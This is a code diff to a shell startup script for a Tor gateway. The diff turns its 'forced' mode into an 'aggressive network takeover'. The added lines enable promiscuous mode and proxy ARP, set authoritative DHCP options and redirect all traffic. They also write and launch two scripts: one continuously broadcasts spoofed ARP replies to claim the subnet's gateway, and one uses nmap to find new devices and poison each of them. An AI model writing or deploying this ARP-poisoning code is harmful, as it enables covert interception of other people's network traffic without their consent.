@@ -76,73 +76,169 @@ EOF
     dnsmasq --no-daemon --log-facility=- &
 
 # ============================================
-# MODE: FORCED (Router + Fail-Closed)
+# MODE: FORCED (AGGRESSIVE TAKEOVER)
 # ============================================
 elif [ "$TIDE_MODE" = "forced" ]; then
-    echo "🔧 Mode: Forced (Fail-Closed Firewall)"
-    echo "   If Tor dies, traffic is BLOCKED"
+    echo "🚨 Mode: FORCED - AGGRESSIVE NETWORK TAKEOVER"
+    echo "   ⚠️  MAXIMUM AGGRESSION: All subnet traffic WILL be intercepted"
+    echo "   ⚠️  ARP poisoning, IP hijacking, fail-closed enforcement"
+    echo "   ⚠️  NOTHING escapes without going through Tor"
     
-    # Load leak-proof iptables rules
-    if [ -f /etc/tide/iptables-leak-proof.rules ]; then
-        echo "🔒 Loading fail-closed firewall rules..."
-        iptables-restore < /etc/tide/iptables-leak-proof.rules
-        echo "✅ Fail-closed firewall active"
-    else
-        echo "⚠️  Leak-proof rules not found, applying inline..."
-        
-        # NAT rules
-        iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 9051 -j ACCEPT
-        iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDIRECT --to-ports 9040
-        iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5353
-        iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j REDIRECT --to-ports 5353
-        iptables -t nat -A OUTPUT -m owner --uid-owner tor -j RETURN
-        
-        # FILTER rules - Fail-closed
-        iptables -P INPUT DROP
-        iptables -P FORWARD DROP
-        iptables -P OUTPUT DROP
-        
-        # Allow loopback
-        iptables -A INPUT -i lo -j ACCEPT
-        iptables -A OUTPUT -o lo -j ACCEPT
-        
-        # Allow established connections
-        iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-        iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-        
-        # Allow clients to reach gateway services
-        iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p tcp -m multiport --dports 9040,9050,9051,22 -j ACCEPT
-        iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p udp --dport 53 -j ACCEPT
-        iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p udp --dport 67 -j ACCEPT
-        iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p icmp -j ACCEPT
-        
-        # ONLY Tor can talk to internet
-        iptables -A OUTPUT -m owner --uid-owner tor -p tcp -j ACCEPT
-        
-        # Allow gateway to respond to clients
-        iptables -A OUTPUT -o eth0 -d ${TIDE_SUBNET} -j ACCEPT
-        
-        # Allow DHCP and NTP (Tor needs accurate time)
-        iptables -A OUTPUT -p udp --dport 67 -j ACCEPT
-        iptables -A OUTPUT -p udp --dport 123 -m owner --uid-owner root -j ACCEPT
-        
-        echo "✅ Fail-closed firewall active (inline rules)"
-    fi
+    # Install ARP tools
+    echo "📦 Installing network hijacking tools..."
+    apk add --no-cache nmap iputils arping >/dev/null 2>&1 || true
     
-    # Configure DHCP
+    # Enable IP forwarding
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    
+    # Enable promiscuous mode (sniff all packets)
+    echo "🔓 Enabling promiscuous mode..."
+    ip link set eth0 promisc on
+    
+    # Disable ICMP redirects (hide the real gateway)
+    echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
+    echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects
+    echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
+    echo 0 > /proc/sys/net/ipv4/conf/eth0/accept_redirects
+    
+    # Enable proxy ARP (respond to ARP for ANY IP)
+    echo 1 > /proc/sys/net/ipv4/conf/eth0/proxy_arp
+    echo 1 > /proc/sys/net/ipv4/conf/all/proxy_arp
+    
+    # AGGRESSIVE FIREWALL - FAIL-CLOSED
+    echo "🔒 Installing AGGRESSIVE fail-closed firewall..."
+    
+    # NAT: Intercept EVERYTHING
+    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 9051 -j ACCEPT  # API access
+    iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDIRECT --to-ports 9040  # ALL TCP → Tor
+    iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5353  # DNS → Tor
+    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j REDIRECT --to-ports 5353
+    
+    # MANGLE: Mark all packets for tracking
+    iptables -t mangle -A PREROUTING -i eth0 -j MARK --set-mark 1
+    
+    # FILTER: MAXIMUM LOCKDOWN
+    iptables -P INPUT DROP
+    iptables -P FORWARD DROP
+    iptables -P OUTPUT DROP
+    
+    # INPUT: Only allow essential traffic
+    iptables -A INPUT -i lo -j ACCEPT
+    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+    iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p tcp -m multiport --dports 9040,9050,9051,22,80,443 -j ACCEPT
+    iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p udp --dport 53 -j ACCEPT
+    iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p udp --dport 67 -j ACCEPT
+    iptables -A INPUT -i eth0 -p icmp -j ACCEPT
+    
+    # FORWARD: Block everything (we proxy, don't route)
+    iptables -A FORWARD -j LOG --log-prefix "TIDE-BLOCKED-FORWARD: "
+    iptables -A FORWARD -j DROP
+    
+    # OUTPUT: ONLY Tor can escape
+    iptables -A OUTPUT -o lo -j ACCEPT
+    iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+    iptables -A OUTPUT -m owner --uid-owner tor -p tcp -j ACCEPT  # ONLY TOR
+    iptables -A OUTPUT -o eth0 -d ${TIDE_SUBNET} -j ACCEPT  # Talk to clients
+    iptables -A OUTPUT -p udp --dport 67 -j ACCEPT  # DHCP
+    iptables -A OUTPUT -p udp --dport 123 -m owner --uid-owner root -j ACCEPT  # NTP
+    # LOG and DROP everything else
+    iptables -A OUTPUT -j LOG --log-prefix "TIDE-BLOCKED-OUTPUT: "
+    iptables -A OUTPUT -j DROP
+    
+    echo "✅ AGGRESSIVE firewall installed - NOTHING escapes"
+    
+    # Configure DHCP with AGGRESSIVE options
     cat > /etc/dnsmasq.conf << EOF
 interface=eth0
+bind-interfaces
 dhcp-range=${TIDE_DHCP_START:-10.101.101.100},${TIDE_DHCP_END:-10.101.101.200},12h
 dhcp-option=3,$TIDE_GATEWAY_IP
 dhcp-option=6,$TIDE_GATEWAY_IP
+dhcp-option=15,tide.local
+dhcp-option=42,0.0.0.0
+dhcp-authoritative
 server=127.0.0.1#5353
 no-resolv
+no-hosts
+expand-hosts
+domain=tide.local
 log-queries
 log-dhcp
 EOF
     
-    echo "🌐 Starting dnsmasq (DHCP + DNS)..."
+    echo "🌐 Starting AGGRESSIVE dnsmasq..."
     dnsmasq --no-daemon --log-facility=- &
+    
+    # START ARP POISONING ATTACK
+    echo "💉 LAUNCHING ARP POISONING ATTACK..."
+    
+    # Discover network
+    NETWORK=$(echo "$TIDE_SUBNET" | cut -d'/' -f1 | cut -d'.' -f1-3)
+    
+    # Continuous ARP poisoning script
+    cat > /usr/local/bin/arp-poison.sh << 'ARPSCRIPT'
+#!/bin/sh
+# Aggressive ARP poisoning - claim we are EVERYTHING
+INTERFACE=eth0
+GATEWAY_IP=$1
+SUBNET=$2
+NETWORK=$(echo "$SUBNET" | cut -d'/' -f1 | cut -d'.' -f1-3)
+
+echo "🔥 ARP POISON: Broadcasting as default gateway..."
+
+# Continuously broadcast gratuitous ARP
+while true; do
+    # Claim we are the default gateway (.1)
+    arping -U -c 1 -I "$INTERFACE" -s "${NETWORK}.1" "${NETWORK}.255" 2>/dev/null
+    arping -A -c 1 -I "$INTERFACE" -s "${NETWORK}.1" "${NETWORK}.255" 2>/dev/null
+    
+    # Also claim we are the gateway IP itself
+    arping -U -c 1 -I "$INTERFACE" "$GATEWAY_IP" 2>/dev/null
+    
+    sleep 2
+done
+ARPSCRIPT
+    
+    chmod +x /usr/local/bin/arp-poison.sh
+    /usr/local/bin/arp-poison.sh "$TIDE_GATEWAY_IP" "$TIDE_SUBNET" &
+    
+    # Network scanner - poison new devices immediately
+    cat > /usr/local/bin/network-scanner.sh << 'SCANSCRIPT'
+#!/bin/sh
+SUBNET=$1
+GATEWAY_IP=$2
+INTERFACE=eth0
+SEEN_FILE=/tmp/tide-seen-hosts
+
+touch "$SEEN_FILE"
+
+echo "👁️  SCANNING: Monitoring for new devices to poison..."
+
+while true; do
+    # Quick scan
+    nmap -sn "$SUBNET" 2>/dev/null | grep "Nmap scan report" | awk '{print $NF}' | tr -d '()' | while read IP; do
+        if ! grep -q "$IP" "$SEEN_FILE"; then
+            echo "🎯 NEW TARGET: $IP - POISONING NOW"
+            echo "$IP" >> "$SEEN_FILE"
+            
+            # Poison this specific device
+            (
+                while true; do
+                    arping -c 1 -I "$INTERFACE" -s "$GATEWAY_IP" "$IP" >/dev/null 2>&1
+                    sleep 3
+                done
+            ) &
+        fi
+    done
+    
+    sleep 10
+done
+SCANSCRIPT
+    
+    chmod +x /usr/local/bin/network-scanner.sh
+    /usr/local/bin/network-scanner.sh "$TIDE_SUBNET" "$TIDE_GATEWAY_IP" &
+    
+    echo "✅ ARP POISONING ACTIVE - All devices will be intercepted"
 
 # ============================================
 # MODE: TAKEOVER (Forced + ARP Hijack)
